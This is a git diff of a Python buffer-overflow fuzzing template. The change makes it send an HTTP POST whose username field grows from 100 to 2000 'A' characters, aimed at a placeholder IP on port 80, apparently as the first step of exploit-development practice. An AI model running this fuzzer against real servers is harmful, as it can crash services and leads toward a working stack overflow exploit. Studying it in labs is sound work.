@@ -1,14 +1,17 @@
 #!/usr/bin/python
 import socket
+import time
+import sys
 
-# This Template Uses Username as a field. Change this on line 15
-# Change IP on lines 18,22,32
-# Replace Buffer Post request details with BurpSuite Post Request details
+# This Template Uses Username as a field.
+# Change IP on lines 21,25,35
+# Replace Buffer Post request details with BurpSuite Post Request details lines 20-28
 
-try:
-    print "\nSending evil buffer..."
+size = 100
 
-    size = 100
+while(size < 2000):
+  try:
+    print "\nSending evil buffer with %s bytes" % size
     
     inputBuffer = "A" * size
     
@@ -27,14 +30,16 @@ try:
     
     buffer += content
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
     
     s.connect(("x.x.x.x", 80))
     s.send(buffer)
     
     s.close()
 
-    print "\nDone!"
+    size += 100
+    time.sleep(10)
     
-except:
-    print "Could not connect!"
+  except:
+    print "\nCould not connect!"
+    sys.exit()
